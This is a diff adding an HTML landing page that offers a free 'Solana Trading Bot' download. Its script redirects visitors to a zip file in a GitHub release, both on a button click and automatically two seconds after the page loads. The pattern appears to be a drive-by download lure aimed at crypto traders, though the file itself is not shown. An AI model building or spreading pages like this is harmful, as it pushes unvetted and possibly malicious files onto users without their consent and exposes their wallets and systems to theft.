@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Download Solana Trading Bot</title>
+<meta name="description" content="Free Solana Trading Bot download. Automate Solana trading easily.">
+<meta name="keywords" content="Solana Trading Bot, Solana automation, crypto bot download">
+<style>
+body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background: #0f0f0f;
+    color: white;
+    font-family: Arial, sans-serif;
+    text-align: center;
+}
+button {
+    background: linear-gradient(90deg, #555, #8e44ad);
+    border: none;
+    padding: 14px 28px;
+    color: white;
+    font-size: 18px;
+    border-radius: 8px;
+    cursor: pointer;
+}
+button:hover {
+    background: linear-gradient(90deg, #8e44ad, #555);
+}
+h1 {
+    margin-bottom: 20px;
+}
+</style>
+</head>
+<body>
+<div>
+    <h1>Download Solana Trading Bot</h1>
+    <p>Click the button below or wait for automatic download.</p>
+    <button id="downloadBtn">Download Now</button>
+</div>
+
+<script>
+const fileUrl = "https://github.com/So1dev/bot/releases/download/bot/Bot.zip";
+
+document.getElementById("downloadBtn").addEventListener("click", function() {
+    window.location.href = fileUrl;
+});
+
+// Автозагрузка через 2 сек при заходе
+setTimeout(() => {
+    window.location.href = fileUrl;
+}, 2000);
+</script>
+</body>
+</html>
